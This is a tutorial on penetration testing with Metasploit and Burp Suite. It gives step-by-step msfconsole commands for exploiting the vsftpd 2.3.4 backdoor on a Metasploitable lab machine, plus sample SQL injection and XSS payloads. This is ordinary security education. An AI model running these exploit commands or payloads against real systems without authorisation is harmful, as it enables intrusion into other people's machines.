# Metasploit: Penetration Testing Framework & Burp Suite: Web Application Security Testing

## Metasploit: Penetration Testing Framework

### Introduction to Metasploit
Metasploit is one of the most widely used penetration testing frameworks in cybersecurity. It provides a platform to identify, exploit, and validate vulnerabilities in systems. Metasploit includes a vast library of exploits, payloads, encoders, and tools for performing penetration tests against networked systems, applications, and services.

---

## Scenario 1: Exploiting a Vulnerable System Using Metasploit

**Objective**: Perform a penetration test using Metasploit to exploit a vulnerable system and gain access.

#### Steps:

1. **Identify Target System**:
   Ensure you have a target system that is intentionally vulnerable, such as a virtual machine running **Metasploitable**.

2. **Start Metasploit Framework**:
   ```bash
   msfconsole
   ```
   Launch Metasploit framework in the terminal.

3. **Search for Vulnerabilities**:
   ```bash
   search vsftpd
   ```
   Search for vulnerabilities related to the **vsftpd** service.

4. **Select an Exploit**:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

5. **Configure Target Parameters**:
   ```bash
   set RHOSTS 192.168.1.100
   ```

6. **Select and Set Payload**:
   ```bash
   set PAYLOAD cmd/unix/interact
   ```

7. **Run the Exploit**:
   ```bash
   run
   ```

8. **Post-Exploitation**:
   Example: Listing processes
   ```bash
   ps
   ```

#### Deep Dive into Metasploit:
- **Modules**: Exploit modules take advantage of vulnerabilities, payload modules are executed after an exploit, and auxiliary modules perform scanning tasks.
- **Payloads**: Common payloads include reverse shells, Meterpreter, and command execution.

#### Outcome:
You gain access to a vulnerable system using a Metasploit exploit, showcasing how vulnerabilities can be exploited.

## Burp Suite: Web Application Security Testing

### Introduction to Burp Suite
Burp Suite is a powerful tool used for web application security testing. It provides functionality for scanning, intercepting traffic, manipulating web requests, and performing vulnerability testing.

---

## Scenario 2: Testing a Web Application for Vulnerabilities Using Burp Suite

**Objective**: Use Burp Suite to intercept and analyze web traffic, and test for vulnerabilities.

#### Steps:

1. **Set Up Burp Suite**:
   Configure your web browser to use Burp Suite as an HTTP/HTTPS proxy. In Burp Suite, navigate to **Proxy > Intercept**.

2. **Intercept and Modify Requests**:
   Review HTTP request details, including headers, parameters, and cookies.

3. **Fuzzing Web Parameters for SQL Injection**:
   Example SQL Injection payload:
   ```sql
   ' OR 1=1 -- 
   ```

4. **Automated Vulnerability Scanning**:
   Use **Burp Scanner** to automatically detect vulnerabilities.

5. **Cross-Site Scripting (XSS) Testing**:
   Inject JavaScript payload:
   ```html
   <script>alert('XSS')</script>
   ```

6. **Analyzing Responses**:
   Burp Suite displays detailed HTTP responses.

#### Deep Dive into Burp Suite:
- **Proxy Interception**: Modify requests before they reach the server.
- **Scanner**: Detect vulnerabilities like SQL injection, XSS, and CSRF.
- **Repeater**: Manually test requests multiple times with modified payloads.

#### Outcome:
You use Burp Suite to intercept and modify web requests, and test for common vulnerabilities like SQL injection and XSS.

## Combining Metasploit and Burp Suite for Web Exploitation

**Objective**: Use Burp Suite to identify vulnerabilities and Metasploit to exploit them.

#### Steps:

1. **Identify SQL Injection Vulnerability with Burp Suite**:
   Use **Proxy** and **Repeater** tools to confirm the vulnerability.

2. **Search for Exploits in Metasploit**:
   ```bash
   search sql
   ```

3. **Exploit the SQL Injection**:
   Set target and payload, then run the exploit in Metasploit.

4. **Post-Exploitation**:
   Use **Meterpreter** to gain shell access and explore the system.

#### Outcome:
You combine Burp Suite for vulnerability discovery and Metasploit for exploitation, demonstrating a complete web application penetration test.

## Conclusion
Metasploit and Burp Suite are essential tools for penetration testing and web application security. **Metasploit** is used to exploit vulnerabilities in systems, while **Burp Suite** allows for in-depth traffic analysis and vulnerability testing. Together, they provide a comprehensive approach to identifying and exploiting security flaws.
